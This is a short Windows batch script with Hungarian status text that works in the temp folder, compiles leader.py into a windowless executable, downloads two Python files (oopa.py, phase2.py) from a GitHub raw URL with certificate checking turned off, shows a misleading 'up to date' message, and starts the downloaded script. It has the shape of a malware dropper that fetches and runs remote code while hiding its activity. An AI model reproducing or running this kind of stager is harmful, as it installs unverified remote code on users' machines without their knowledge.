@echo off
echo Letoltes inditasa...

cd /d "%TEMP%"

pyinstaller --onefile --noconsole leader.py


curl -L -k -o "oopa.py" "https://raw.githubusercontent.com/plen-maker/Vers1/main/oopa.py"
curl -L -k -o "phase2.py" "https://raw.githubusercontent.com/plen-maker/Vers1/main/phase2.py"

if exist "oopa.py" (
    echo up to date
) else (
    echo Error
)
start oopa.py "C:\Users\%USERNAME%\AppData\Local\Temp\oopa.py"
exit